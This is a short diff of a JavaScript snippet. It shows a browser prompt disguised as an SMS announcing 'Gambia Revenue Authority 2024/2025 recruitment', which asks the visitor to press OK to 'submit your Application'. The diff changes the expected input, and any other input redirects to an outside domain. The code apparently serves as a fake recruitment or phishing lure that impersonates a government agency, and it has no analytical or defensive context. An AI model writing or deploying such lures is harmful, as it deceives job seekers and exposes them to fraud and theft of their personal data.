@@ -1,6 +1,6 @@
 
-var password = '1'
-password=prompt('SMS: Registration is ongoing for the Gambia Revenue Authority 2024/2025 recruitment, kindly press 1 to submit your Application','1');
-if (password != '1') {
+var password = 'APPLY NOW'
+password=prompt('SMS: Registration is ongoing for the Gambia Revenue Authority 2024/2025 recruitment, kindly press Ok to submit your Application','APPLY NOW');
+if (password != 'APPLY NOW') {
 location.href='https://all-free-byt.org/gambia.html';
 }
